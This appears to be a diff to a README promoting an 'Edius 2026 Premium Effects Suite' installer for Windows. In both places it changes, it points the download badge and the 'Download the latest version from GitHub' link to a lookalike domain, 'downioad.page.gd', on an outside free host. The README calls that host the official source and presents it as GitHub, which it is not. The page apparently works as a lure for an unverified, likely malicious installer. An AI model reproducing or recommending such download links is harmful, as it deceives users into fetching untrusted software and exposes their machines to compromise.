@@ -2,7 +2,7 @@
 
 The Grass Valley Edius 2026 Premium Effects Suite is a comprehensive toolkit designed to elevate your video editing projects on Windows. This package includes a wide range of effects, templates, and utilities that integrate seamlessly with Edius, providing professionals and enthusiasts with powerful tools to enhance their creative workflow. Whether you're working on short clips or full-length productions, this suite offers the flexibility and performance needed to achieve high-quality results.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -64,7 +64,7 @@ A: Updates are announced on the GitHub repository. Download the latest installer
 
 For the most recent version and updates, please download directly from the official source:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: October 2026*  
 *Developed by the Edius Community for enhanced video editing experiences on Windows.*
